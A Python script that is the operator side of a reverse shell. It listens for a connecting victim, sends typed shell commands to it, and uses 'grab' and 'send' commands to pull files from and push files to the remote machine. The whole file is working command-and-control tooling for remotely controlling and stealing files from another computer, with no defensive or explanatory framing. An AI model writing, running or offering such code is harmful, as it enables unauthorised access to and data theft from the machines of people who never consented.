import socket,os
import requests

k='d'

# For sending file to client
def trn(conn,cmd,s,ad):
    cmd=cmd.split('-')[0]
    cmd=cmd.split('*')[-1]
    print(cmd)
    print(ad)
    if os.path.exists(cmd):
        f=open(cmd,'rb')
        pac=f.read(1024)
        while len(pac)>10:
            try:
                conn.send(pac)
            except Exception as e:
                print(e)
            pac=f.read(1024)            
        f.close()
        print('done')
    else:
        conn.send('Unable'.encode('utf-8'))
        print('Unable')   

# For receiving the file from client

def transfer(con,cmd):
    cmd=cmd.split('*')[-1]
    file=cmd.split('\\')[-1]
    print(file)
    f=open(r'C:\Users\Tushar\Desktop'+'\\'+file,'wb')
    while True:
        k=con.recv(2048)
        if len(k)>10:
            f.write(k)
        elif len(k)==6:
            if 'Unable' in str(k.decode('utf-8')):
                print("Unable to fetch data")
                f.close()
                break
        elif len(k)==4:
            if 'done' in str(k.decode('utf-8')):
                print('Done')
                f.close()
                break
        else:
            f.close()
            break

# For making an connection
def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    # change this ip with your ip address
    s.bind(('Ip address',12345))
    s.listen(1)
    global k
    conn,k=s.accept()
    print(k)
    
    while(True):
        
        cmd=input('Shell>> ')
        if 'terminate' in cmd:
            conn.send(cmd.encode('utf-8'))
            conn.close()
            s.close()

        elif 'grab' in cmd:
            conn.send(cmd.encode('utf-8'))
            transfer(conn,cmd)
            
        elif 'send' in cmd:
            conn.send(cmd.encode('utf-8'))
            trn(conn,cmd,s,k)
            
        else:
            conn.send(cmd.encode('utf-8'))
            b=str(conn.recvfrom(9086))
            print(b)
                
# Loop for foreever
while(k!=''):         
    try:
        connect()
    except:
        print('Waiting,Client is offline')
        
